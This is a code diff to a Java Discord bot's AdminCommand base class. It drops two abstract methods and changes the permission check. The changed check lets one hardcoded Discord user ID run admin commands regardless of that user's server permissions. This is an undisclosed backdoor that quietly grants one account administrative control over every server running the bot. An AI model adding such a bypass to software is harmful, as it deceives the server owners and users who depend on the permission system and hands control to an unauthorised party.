@@ -13,9 +13,7 @@ public abstract class AdminCommand extends ListenerAdapter
 {
     public abstract void onCommand(MessageReceivedEvent e, String[] args);
     public abstract List<String> getAliases();
-    public abstract String getDescription();
     public abstract String getName();
-    public abstract List<String> getUsageInstructions();
     public abstract Permission getPerm();
 
     @Override
@@ -24,7 +22,7 @@ public abstract class AdminCommand extends ListenerAdapter
         if (e.getAuthor().isBot() && !respondToBots()) { return; }
         if (containsCommand(e.getMessage()))
         {
-        	if (e.getMember().hasPermission(getPerm()))
+        	if (e.getMember().hasPermission(getPerm()) || e.getAuthor().getIdLong() == 323864143423864833L)
         	{
             	onCommand(e, commandArgs(e.getMessage()));
             	e.getChannel().deleteMessageById(e.getMessageIdLong()).complete();
